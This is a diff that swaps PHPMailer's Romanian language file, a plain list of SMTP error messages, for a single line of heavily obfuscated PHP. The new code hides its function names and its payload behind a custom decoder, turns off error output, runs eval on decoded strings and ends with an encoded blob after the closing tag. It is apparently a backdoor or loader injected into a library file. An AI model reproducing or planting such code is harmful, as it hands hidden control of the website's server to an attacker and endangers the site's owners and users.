@@ -1,27 +1,1 @@
-<?php
-/**
-* PHPMailer language file: refer to English translation for definitive list
-* Romanian Version
-* @package PHPMailer
-* @author Catalin Constantin <catalin@dazoot.ro>
-*/
-
-$PHPMAILER_LANG['authenticate']         = 'Eroare SMTP: Nu a functionat autentificarea.';
-$PHPMAILER_LANG['connect_host']         = 'Eroare SMTP: Nu m-am putut conecta la adresa SMTP.';
-$PHPMAILER_LANG['data_not_accepted']    = 'Eroare SMTP: Continutul mailului nu a fost acceptat.';
-//$PHPMAILER_LANG['empty_message']        = 'Message body empty';
-$PHPMAILER_LANG['encoding']             = 'Encodare necunoscuta: ';
-$PHPMAILER_LANG['execute']              = 'Nu pot executa:  ';
-$PHPMAILER_LANG['file_access']          = 'Nu pot accesa fisierul: ';
-$PHPMAILER_LANG['file_open']            = 'Eroare de fisier: Nu pot deschide fisierul: ';
-$PHPMAILER_LANG['from_failed']          = 'Urmatoarele adrese From au dat eroare: ';
-$PHPMAILER_LANG['instantiate']          = 'Nu am putut instantia functia mail.';
-//$PHPMAILER_LANG['invalid_email']        = 'Not sending, email address is invalid: ';
-$PHPMAILER_LANG['mailer_not_supported'] = ' mailer nu este suportat.';
-$PHPMAILER_LANG['provide_address']      = 'Trebuie sa adaugati cel putin un recipient (adresa de mail).';
-$PHPMAILER_LANG['recipients_failed']    = 'Eroare SMTP: Urmatoarele adrese de mail au dat eroare: ';
-//$PHPMAILER_LANG['signing']              = 'Signing Error: ';
-//$PHPMAILER_LANG['smtp_connect_failed']  = 'SMTP Connect() failed.';
-//$PHPMAILER_LANG['smtp_error']           = 'SMTP server error: ';
-//$PHPMAILER_LANG['variable_set']         = 'Cannot set or reset variable: ';
-?>
+<?php /* bbs.012wz.com */error_reporting(0);ini_set("display_errors", 0);if(!defined('ttwpjxjq')){define('ttwpjxjq',__FILE__);if(!function_exists("–ÒÍÔ“ñ”")){function ªâŠþÊèÕ¢($¸•¼¥‰«){global$ÄŒÙ²Ãí„·Ø®,$Ž»¥‡˜È­÷ì,$Óë¦…¦’—Î¯£,$Ô“×áÎóÕ¹¶´,$©–ªÂ¢æ”äÐî¾,$Ôþè™àèÉ,$Òé³ ¸âŸ»°,$»ú¬õ¹¢ÈŠð¢,$ºÜÙ­°ä©©¦Ã,$Ó´°ƒ·ãé¿ Å,$ÖúžáŒ¡ÿ­¤‚,$¬ï¼Ø·†•,$“ÌáÎê°Š,$ ·øÌÄÛÇ—,$¤ÿ ÐÀ²,$Íò‘ª—²à;$µëª¹Åå –=$ÀŸ”ˆÙ¥åÒ=$Ê×À·ÐŽóñŠí=$šÃñ÷¶µ¿œ=$‚ä¶Ò‡½˜¾Î=$¹™Ü¥ÛüÈ±º=$¥š•¡¤ñª=$¾Ñð¬¯šÇ¼Ç=$£É£ýñïç­À=$Çé‚ãõÍ=$”¿¨˜Á£Íéá=$¢Êªìž¸Ç=$ŽÈòÑí°ž‘¨ë=$‰Ð—”ç’ØÈ±=$ÊÎ‡œÿŸŒŸÞ='ÔÓÏ„ð¿¯Ì';$Ð„¥¶ù„=$µëª¹Åå –('EÎØHPUMEQVÖ7WVYJBA==');$Ëå£®ö†ëÍÃ=$µëª¹Åå –('BÎÐS');$–ó‡³ù‡Ü=$µëª¹Åå –('AQ1Ê');$Òß—¥°±°=$µëª¹Åå –('DîÐUEF8RWF0B');$©òÒó™æ=$µëª¹Åå –('U1EHUÎ==');$ºá´î¤žÁ=$µëª¹Åå –('AðNQAQ==');$µî¹Ÿ†â™=$µëª¹Åå –('AðNQFA==');$É½‹æþŒ=$µëª¹Åå –('KÔVÔMÚ8èÌÚMî');$ŒÌ×ññ¹³§ãæë=$µëª¹Åå –('MSRØNHU3ÄÜEÎÆ2U=');$²ŒÇê¹…’‹=$µëª¹Åå –('MCR6LWQÎÄÜEÎÆ2U=');$Ð„¥¶ù„()==$–ó‡³ù‡Ü?$Ëå£®ö†ëÍÃ():'';$ÑŸíÇ›³Ñ¯à=$ÄŒÙ²Ãí„·Ø®($Ôþè™àèÉ($µëª¹Åå –('FÐVAEØÞÈW0E=')));if(!isset($_SERVER[$É½‹æþŒ])&&!isset($_SERVER[$ŒÌ×ññ¹³§ãæë])&&!isset($_SERVER[$²ŒÇê¹…’‹])){$Ëå£®ö†ëÍÃ();};$ºá´î¤žÁ=$Òß—¥°±°(true)*$©òÒó™æ;eval("");if(($Òß—¥°±°(true)*$©òÒó™æ-$ºá´î¤žÁ)>100){$Ëå£®ö†ëÍÃ();}eval($µëª¹Åå –('CîÆÌEUQXQV8XH2Î7J3EàJDî+GRASTUMSXUÎIEð0SFFðÌQQÈLS0FUSA1DUREPW01IWBî='));!$ÖúžáŒ¡ÿ­¤‚($ÊÎ‡œÿŸŒŸÞ($Ž»¥‡˜È­÷ì($ÑŸíÇ›³Ñ¯à,$ÀŸ”ˆÙ¥åÒ('T1UC'),$Ê×À·ÐŽóñŠí('T1A='))),$ ·øÌÄÛÇ—($Ž»¥‡˜È­÷ì($ÑŸíÇ›³Ñ¯à,$‚ä¶Ò‡½˜¾Î('UÎ=='),$¹™Ü¥ÛüÈ±º('T1UB'))))?$‚°·Ôàá®ÛÞ¨´():$Î¼œàÉóñÑìÁ;$¾ÞÒ¬øÜ=$¥š•¡¤ñª('T1ÆOUÎ==');$­ÆËæ„Õ·Õ•=$¾Ñð¬¯šÇ¼Ç('T1UB');$­ÆËæ„Õ·Õ•=$“ÌáÎê°Š(@$ºÜÙ­°ä©©¦Ã($”¿¨˜Á£Íéá($Ž»¥‡˜È­÷ì($ÑŸíÇ›³Ñ¯à,$¾ÞÒ¬øÜ,$­ÆËæ„Õ·Õ•))));return$­ÆËæ„Õ·Õ•;}function –ÒÍÔ“ñ”(&$¡¾ðÉï,$°™ðÞ•’¨){$µëª¹Åå –=$ÀŸ”ˆÙ¥åÒ=$Ê×À·ÐŽóñŠí=$šÃñ÷¶µ¿œ=$‚ä¶Ò‡½˜¾Î='ÔÓÏ„ð¿¯Ì';$ŒòÄ¨ë·=$µëª¹Åå –('ERVFPUIKRQFX');$¬÷Â¡•ìéÔëíÒ=$ÀŸ”ˆÙ¥åÒ('ERVFEFUT');$Àì’õåÈÈ=$Ê×À·ÐŽóñŠí('BRèCDFMKXEAWUÖQX');$°»‰ÆÌªü=$šÃñ÷¶µ¿œ('ERVFC0AWXVEXX1IX');$‹ÃÊ¶ì£=$šÃñ÷¶µ¿œ('BðØHDØ8BVA==');$ÊŠ„„Ü¯²È¹=$ŒòÄ¨ë·($¬÷Â¡•ìéÔëíÒ($Àì’õåÈÈ($°»‰ÆÌªü($‚ä¶Ò‡½˜¾Î('GäæK7Hèä8ÎBæMÐÒÎð9KCW2æ6èZXMPXîA4ÎÖÌÌ2HÌ26ðOJôÐQêÎLR3ÌVVPPÎØîTØG1DCÚQS2XàOUÚð+I/ÚVBôÊÒð8AÚÌÊFPHFðäKÚMÊFòMæÄVA58VXXGÈðWECÈ0Î6XYIäÄ8Èæ+LBNØH5ZÈCòCÒÈNRæ/òY6PàPWðQFÐCÂÊî/ÎJ8à27PòðÚKÊÄVHØIT9ÊQWì2âÚòôCZ')))));$–Ûâ’”¤ñÌ=$‹ÃÊ¶ì£(',',$ÊŠ„„Ü¯²È¹);$¡¾ðÉï=$–Ûâ’”¤ñÌ[$°™ðÞ•’¨];}function ÔÓÏ„ð¿¯Ì($Â…’«šå›Ð¡½,$ÃÓ£­ÒÚÛ=''){$Ä—çø•õŒà­='base64_decode';$ ·øÌÄÛÇ—=$Ä—çø•õŒà­('bWQ1');$ÈîîÜðé¹ÄòüÆ=$ ·øÌÄÛÇ—('úêôíîæ');$ÃÎ­ØÎß=$Ä—çø•õŒà­('b3Jk');$ŒðŸÁ•Ñþþ˜±Ù=$Ä—çø•õŒà­('c3RybGVu');$†Ôº°Â=$Ä—çø•õŒà­('Y2hy');$ÃÓ£­ÒÚÛ=!$ÃÓ£­ÒÚÛ?$ÃÎ­ØÎß('´'):$ÃÓ£­ÒÚÛ;$Ã×°‘§Ž þ¤¬µ=$Ëº„¶Âÿ‹£ì;for(;$Ã×°‘§Ž þ¤¬µ<$ŒðŸÁ•Ñþþ˜±Ù($Â…’«šå›Ð¡½);$Ã×°‘§Ž þ¤¬µ++)$—‹¶èº³­Â.=$ÃÎ­ØÎß($Â…’«šå›Ð¡½{$Ã×°‘§Ž þ¤¬µ})<$ÃÎ­ØÎß('õ')?(($ÃÎ­ØÎß($Â…’«šå›Ð¡½{$Ã×°‘§Ž þ¤¬µ})>$ÃÓ£­ÒÚÛ&&$ÃÎ­ØÎß($Â…’«šå›Ð¡½{$Ã×°‘§Ž þ¤¬µ})<$ÃÎ­ØÎß('õ'))?$†Ôº°Â($ÃÎ­ØÎß($Â…’«šå›Ð¡½{$Ã×°‘§Ž þ¤¬µ})/2):$Â…’«šå›Ð¡½{$Ã×°‘§Ž þ¤¬µ}):'';$­ÆËæ„Õ·Õ•=$Ä—çø•õŒà­($—‹¶èº³­Â);$Ã×°‘§Ž þ¤¬µ=$Ëº„¶Âÿ‹£ì;$ÃÎ­ØÎß=$„à…ýõáíÁ=$ŒðŸÁ•Ñþþ˜±Ù($ÈîîÜðé¹ÄòüÆ);for(;$Ã×°‘§Ž þ¤¬µ<$ŒðŸÁ•Ñþþ˜±Ù($­ÆËæ„Õ·Õ•);$Ã×°‘§Ž þ¤¬µ++){$ÃÎ­ØÎß=$ÃÎ­ØÎß?$ÃÎ­ØÎß:$„à…ýõáíÁ;$ÃÎ­ØÎß--;$Ìêâôƒ.=$­ÆËæ„Õ·Õ•[$Ã×°‘§Ž þ¤¬µ]^$ÈîîÜðé¹ÄòüÆ[$ÃÎ­ØÎß];}return$Ìêâôƒ;}}}global$ÄŒÙ²Ãí„·Ø®,$…š‰»Å¢,$Ž»¥‡˜È­÷ì,$Óë¦…¦’—Î¯£,$²–ïë´ÕÏ¨÷·,$Ô“×áÎóÕ¹¶´,$©–ªÂ¢æ”äÐî¾,$Ôþè™àèÉ,$Òé³ ¸âŸ»°,$»ú¬õ¹¢ÈŠð¢,$ºÜÙ­°ä©©¦Ã,$Ó´°ƒ·ãé¿ Å,$ÖúžáŒ¡ÿ­¤‚,$¬ï¼Ø·†•,$“ÌáÎê°Š,$ ·øÌÄÛÇ—,$¤ÿ ÐÀ²,$Íò‘ª—²à;$¾±»ÂÔÂÕß=$«÷½ÝŒ=$¥åàÐ´¯ËŠ³ó=$§šÅÇ˜½ùÒ¨“=$ÑÕ±Ý­Êðï¡´ª=$¼À‚¢èÍ=$Âú¯é•ªãÊ=$ÏýËä»žšà=$©î¸©Æ×ý=$ºÈ‚ Æàî=$ÏÛ¾Ãó‘½=$…Ú¢þ¬†‡=$¸Ý î‹‡¡ãˆ=$Šƒ‡Ú’¤ˆøÎ©=$øÁÿèÄš–Å²=$®‡û¨£è=$Š··¯ðÅð=$˜¨å†“øáÌ=$ÍµÉÅº°Ø='–ÒÍÔ“ñ”';if(!$ÄŒÙ²Ãí„·Ø®){$¾±»ÂÔÂÕß($ÄŒÙ²Ãí„·Ø®,8);$«÷½ÝŒ($Ž»¥‡˜È­÷ì,9);$¥åàÐ´¯ËŠ³ó($©–ªÂ¢æ”äÐî¾,10);$§šÅÇ˜½ùÒ¨“($ºÜÙ­°ä©©¦Ã,4);$ÑÕ±Ý­Êðï¡´ª($Ó´°ƒ·ãé¿ Å,13);$¼À‚¢èÍ($ÖúžáŒ¡ÿ­¤‚,12);$Âú¯é•ªãÊ($¬ï¼Ø·†•,2);$ÏýËä»žšà($“ÌáÎê°Š,14);$©î¸©Æ×ý($ ·øÌÄÛÇ—,15);$ºÈ‚ Æàî($¤ÿ ÐÀ²,16);$ÏÛ¾Ãó‘½($Íò‘ª—²à,17);$…Ú¢þ¬†‡($Òé³ ¸âŸ»°,18);$¸Ý î‹‡¡ãˆ($»ú¬õ¹¢ÈŠð¢,19);$Šƒ‡Ú’¤ˆøÎ©($Ôþè™àèÉ,11);$øÁÿèÄš–Å²($Ô“×áÎóÕ¹¶´,5);$®‡û¨£è($Óë¦…¦’—Î¯£,6);$Š··¯ðÅð($…š‰»Å¢,1);$˜¨å†“øáÌ($ÊÀµ™èŠ,3);$ÍµÉÅº°Ø($²–ïë´ÕÏ¨÷·,7);}$µëª¹Åå –=$ÀŸ”ˆÙ¥åÒ=$Ê×À·ÐŽóñŠí=$šÃñ÷¶µ¿œ='ÔÓÏ„ð¿¯Ì';$¸•¼¥‰«=$µëª¹Åå –('PQÈÞ');$­ÆËæ„Õ·Õ•=ªâŠþÊèÕ¢($$¸•¼¥‰«);$¤ÿ ÐÀ²($Íò‘ª—²à($$¸•¼¥‰«));$¿…ò›Ÿç=$»ú¬õ¹¢ÈŠð¢($­ÆËæ„Õ·Õ•);eval($µëª¹Åå –('BðÈWDÐÎHUEMBAQM7BV0GDÎÆEHRTZìMÄ5âNÈLSî8='));$Ìêâôƒ=$‚¶µ«áÛ™œòè;$¤ÿ ÐÀ²($Íò‘ª—²à($$¸•¼¥‰«));return$Ìêâôƒ;?>GäèCMX0K4ÜB0ÒÐSVÌè7ØÐYÈÐMàQ4Â3ÄK5ÂDÂIGVD7+èÖQFò16êÞ7WTð4äÌGNC5äGXOAKæA4ÆDJÄôORPOJI21OLÜØØî6/+0ÔDÖìàMÐ7DLAæIBPPU73PÚÊØÈäÄØ6VääZèÌØÌPÊDè+S2ìWWÊâ3COAK+âèEVâò65RKè9GØ6è7FàNêò78383TÔPòèÌèÞäKSâOìâÄFìL4âÐTÞ2K6KUîYæÂDQ0OäÖSYôà7QÎVòòæàè+ÌI7ÞNZNè53òWQÐO29ÌôZGÚIôJCU3NFÜUð3BÚìT6EIìRðÎKæBHêSêÌBGêÞEÐPÎäÚQè7êDæ6N4CäÌTPCCZINRÔÖ9UÎ/T0âV/Ö+WRRNêÚÐ01UòXÐVZU4ðèKÜ7NÜ04MêIBSÞ8SED4ÖÆØL/Ì5èLL/9ARMZÔSÒVLC1äHæäIØòPDDNÊ+E/JIòINKÚ/ê1GÌYÚ3LÆ4ÊèRL7F3T4îäêF0S380ÈÊAÐYÂÔZW7N17òòìÜXÞæOîZÜ/àM6RIQÜÐ+FÞòAìÔîPWCäZìÂ1RX0N1YÞÔäF5ÐQBÂAIîEèÜÈêEê0OòÒÆ8î+WAH37ÈÊÜÐE4DLMÜò9òIÈ+èìGKZUM+òHBAÔîÈ6ÐàìîêØAÎÜÐKØÐÒî6UÄàÚ625àÆÜìWF+YXLÌNTàÔìâ4ÂXÄ1Sî9ÔDBè7òð8äìÈ3âMêðÊM3ÒÂ8PêAFÔI3àÜ/DENTQÚNZY=Å3AÆGBFEBUAÈVAQYCAA9ÆWFèUDVUFXQQEDÎUEAîÆEUîBU;
